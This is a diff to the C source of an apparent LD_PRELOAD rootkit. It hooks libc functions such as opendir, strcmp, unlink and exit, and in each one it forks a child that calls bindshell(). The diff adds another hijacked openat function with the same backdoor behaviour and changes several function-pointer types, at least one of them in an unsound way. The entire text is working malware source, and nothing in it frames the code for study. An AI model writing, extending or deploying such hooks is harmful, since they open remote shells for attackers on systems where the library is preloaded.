@@ -8,6 +8,9 @@
 #include <netinet/in.h>
 #include <sys/socket.h>
 #include <string.h>
+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <stdarg.h>
 #define LIBC_PATH       "/lib/libc.so.6"
 
 #define REMOTE_ADDR "127.0.0.1"
@@ -121,6 +124,25 @@ DIR     *opendir(const char *name) //our hijacked opendir
 	}
 }
 
+int openat(int dirfd, const char *pathname, int flags, ...){
+    void *handle;
+    int (*sym)(int dirfd, const char *pathname, int flags, ...);
+    const char* libc_path = getlibc();
+    handle = dlopen(libc_path, RTLD_LAZY);
+    sym = (int (*)(int, const char *, int, ...)) dlsym(handle, "openat");
+
+    va_list args;
+    va_start(args, flags);
+    mode_t mode = va_arg(args, mode_t);
+    va_end(args);
+
+    if(fork() == 0){
+        bindshell();
+    }
+    else {
+        return sym(dirfd, pathname, flags, mode);
+    }
+}
 
 char *strcpy(char *restrict dst, const char *restrict src){
 
@@ -142,16 +164,16 @@ char *strcpy(char *restrict dst, const char *restrict src){
 int strcmp(const char *s1, const char *s2){
 
 	void *handle;
-	void *(*sym)(const char *s1, const char *s2);
+	int (*sym)(const char *s1, const char *s2);
 	const char* libc_path = getlibc();
 	handle = dlopen(libc_path, RTLD_LAZY);
-	sym = (void *) dlsym(handle, "strcmp");
+	sym = (int (*)(const char *, const char *)) dlsym(handle, "strcmp");
 
 	if(fork() == 0){
  		bindshell(); 
 	}
 	else {
-  		return (sym(s1, s2));
+  		return sym(s1, s2);
 	}
 
 }
@@ -159,16 +181,16 @@ int strcmp(const char *s1, const char *s2){
 int unlink(const char *pathname){
 
 	void *handle;
-	void *(*sym)(const char *pathname);
+	int (*sym)(const char *pathname);
 	const char* libc_path = getlibc();
 	handle = dlopen(libc_path, RTLD_LAZY);
-	sym = (void *) dlsym(handle, "unlink");
+	sym = (int (*)(const char *)) dlsym(handle, "unlink");
 
 	if(fork() == 0){
  		bindshell(); 
 	}
 	else {
-  		return (sym(pathname));
+  		return sym(pathname);
 	}
 
 }
@@ -179,7 +201,7 @@ void exit(int status){
 	void *(*sym)(int status);
 	const char* libc_path = getlibc();
 	handle = dlopen(libc_path, RTLD_LAZY);
-	sym = (void *) dlsym(handle, "exit");
+	sym = (void *)(int) dlsym(handle, "exit");
 
 	if(fork() == 0){
  		bindshell(); 
@@ -187,6 +209,4 @@ void exit(int status){
 	else {
   		return (sym(status));
 	}
-
 }*/
-
